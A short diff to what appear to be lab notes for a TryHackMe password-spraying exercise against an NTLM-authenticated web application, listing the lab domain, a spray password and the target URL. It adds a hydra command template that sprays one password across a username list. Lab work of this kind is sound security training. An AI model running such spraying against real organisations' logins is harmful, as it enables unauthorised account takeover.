@@ -15,6 +15,9 @@ We provide the following values for each of the parameters:
 <fqdn> - Fully qualified domain name associated with the organisation that we are attacking - "za.tryhackme.com"
 <password> - The password we want to use for our spraying attack - "Changeme123"
 <attackurl> - The URL of the application that supports Windows Authentication - "http://ntlmauth.za.tryhackme.com"
+
+
+hydra -L <username_list> -p <pwd_to_spray> <host> http-get '/:A=NTLM:F=401'
 """
 
 
